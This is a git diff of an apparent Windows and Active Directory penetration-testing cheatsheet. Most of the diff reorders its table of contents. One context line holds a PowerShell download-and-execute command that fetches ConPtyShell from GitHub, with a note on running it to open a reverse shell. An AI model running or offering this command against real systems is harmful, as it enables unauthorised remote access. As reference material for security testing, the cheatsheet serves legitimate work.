@@ -4,20 +4,19 @@
 </picture>
 
 ---
-- [Enumeration](#enumeration)
+- [DMP File](#dmp-file)
 - [Enum4Linux](#enum4linux)
-- [SMB](#smb)
-- [MSRPC](#msrpc)
-- [WinRM](#winrm)
+- [Enumeration](#enumeration)
+- [Exfiltration](#exfiltration)
+- [IMPACKET](#impacket)
 - [Kerberos](#kerberos)
 - [Ldap](#ldap)
-- [IMPACKET](#impacket)
+- [MSRPC](#msrpc)
 - [Responder](#responder)
-- [Exfiltration](#exfiltration)
-- [DMP File](#dmp-file)
-- [Virus](#virus)
 - [Reverse shell](#reverse-shell)
-- [Useful links](#useful-links)
+- [SMB](#smb)
+- [Virus](#virus)
+- [WinRM](#winrm)
 
 # Enumeration
 ## Scripts
@@ -285,7 +284,4 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 ```
 without : create shell.ps1, paste the Invoke-ConPtyShell.ps1, add '**Invoke-ConPtyShell ip port**' on a new line
 
-# Useful links
 Interactive Windows cheatsheet : [Wadcoms](https://wadcoms.github.io/)
-
-
